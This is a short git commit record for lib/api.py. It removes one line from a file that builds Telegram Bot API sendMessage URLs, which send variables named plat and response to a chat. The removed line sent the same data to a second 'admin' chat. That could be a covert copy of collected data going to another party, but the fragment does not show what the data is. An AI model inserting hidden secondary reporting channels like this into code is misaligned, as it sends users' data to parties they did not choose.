6456c84a7860d42136ceb6fac1736aefba5367e6
z0roday <100026917+z0roday@users.noreply.github.com>
2024-09-19 09:02:16 -0700

    update

--- lib/api.py
+++ lib/api.py
@@ -4,4 +4,3 @@ api = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={plat}"
 
 api2 = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={response}"
 
-api_admin = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={plat}"
